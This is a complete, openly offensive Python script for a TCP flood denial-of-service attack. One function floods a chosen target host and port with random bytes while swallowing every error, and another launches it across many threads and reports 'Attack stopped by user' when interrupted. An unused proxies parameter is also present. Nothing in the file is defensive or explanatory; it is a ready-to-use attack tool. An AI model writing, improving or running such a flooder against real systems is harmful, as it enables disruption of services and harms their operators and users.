import socket
import threading
import random
import time
from colorama import Fore

def tcp_flood(target, port, proxies):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        for _ in range(100):
            msg = random._urandom(1024)
            s.send(msg)
        s.close()
    except Exception as e:
        pass  # Fail silently

def start_attack(target, port, threads, proxies):
    print(Fore.GREEN + f"[+] TCP Flood Started on {target}:{port} with {threads} threads")
    time.sleep(1)

    for _ in range(threads):
        th = threading.Thread(target=tcp_flood, args=(target, port, proxies))
        th.daemon = True
        th.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped by user")
